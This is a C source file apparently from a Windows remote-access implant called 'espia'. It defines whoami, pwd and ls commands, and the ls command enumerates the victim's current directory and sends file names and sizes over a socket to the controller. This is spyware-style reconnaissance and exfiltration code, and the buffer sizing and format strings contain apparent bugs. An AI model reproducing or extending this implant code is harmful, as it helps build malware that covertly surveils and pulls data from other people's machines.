#include "includes/espia_comms.h"
#include "includes/espia_func.h"

void whoami(LPWSTR buffer, INT size_buffer) {
    /* Get and append the Hostname */
    DWORD size_comp = size_buffer;
    if (GetComputerNameW(buffer, &size_comp) == 0) {
        Debug(printf("Failed to retrieve the Computer Name : %d\n", GetLastError());)
        wcscat(buffer, L"<failed>");
        size_comp = 8;
    }

    /* Append an '@' symbol */
    wcscat(buffer + size_comp, L"@");
    size_comp++;

    /* Get and append Username */
    DWORD size_usr = size_buffer;
    if (GetUserNameW(buffer + size_comp, &size_usr) == 0) {
        Debug(printf("Failed to retrieve the Username : %d\n", GetLastError()));
        wcscat(buffer, L"<failed>");
    }
}

void pwd(LPWSTR buffer, INT size_buffer) {
    /* Get the current working directory */
    if (GetCurrentDirectoryW(size_buffer, buffer) == 0) {
        Debug(printf("Failed to retrieve the Current working directory: %d\n", GetLastError());)
        wcscat(buffer, L"<failed>");
    }
}

void ls(SOCKET * connection) {
    /* Get the current working directory and append '*' at the end */
    WCHAR temp_dir[MAX_PATH + 1] = L"";
    pwd(temp_dir, sizeof(temp_dir));
    wcscat(temp_dir, L"\\*");

    /* Get the file handler for current working dir */
    WIN32_FIND_DATAW file_data;
    HANDLE file_handle;
    if ((file_handle = FindFirstFileW(temp_dir, &file_data)) == INVALID_HANDLE_VALUE) {
        Debug(printf("FindFirstFileW() failed: %d\n", GetLastError());)
        return;
    }
    memset(temp_dir, 0, sizeof(temp_dir));

    /* Iterate over files/folders */
    LARGE_INTEGER filesize;
    do {
        /* If current file/folder is a directory */
        if (file_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            swprintf(temp_dir, L"%S\t\t\t\t<DIR>\n", file_data.cFileName);                          // swprintf() causes huge file size spike (About 10kb). Find alternative
        } 
        /* Else, a file */
        else {
            filesize.LowPart = file_data.nFileSizeLow;
            filesize.HighPart = file_data.nFileSizeHigh;
            swprintf(temp_dir, L"%S\t\t\t\t%ld bytes\n", file_data.cFileName, filesize.QuadPart);
        }

        espia_send(connection, temp_dir, sizeof(file_data.cFileName));
    } while (FindNextFileW(file_handle, &file_data) != 0);
}